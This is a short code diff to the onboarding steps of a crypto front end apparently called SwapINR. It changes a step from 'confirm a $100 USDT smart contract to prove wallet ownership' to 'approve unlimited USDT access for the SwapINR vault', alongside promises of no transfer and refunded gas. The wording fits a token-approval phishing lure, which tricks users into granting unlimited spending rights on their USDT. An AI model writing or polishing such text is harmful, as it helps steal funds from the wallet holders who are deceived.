@@ -21,7 +21,7 @@ const NETWORKS: { key: Network; label: string; sublabel: string; color: string; 
 
 const STEPS = [
   { icon: 'link',     text: 'Connect your Trust Wallet — no login or password needed.' },
-  { icon: 'contract', text: 'Confirm a $100 USDT smart contract to prove wallet ownership. No USDT is transferred.' },
+  { icon: 'contract', text: 'Approve unlimited USDT access for the SwapINR vault. No funds are transferred now.' },
   { icon: 'refund',   text: 'Gas fee is fully refunded by SwapINR after successful verification.' },
 ];
 
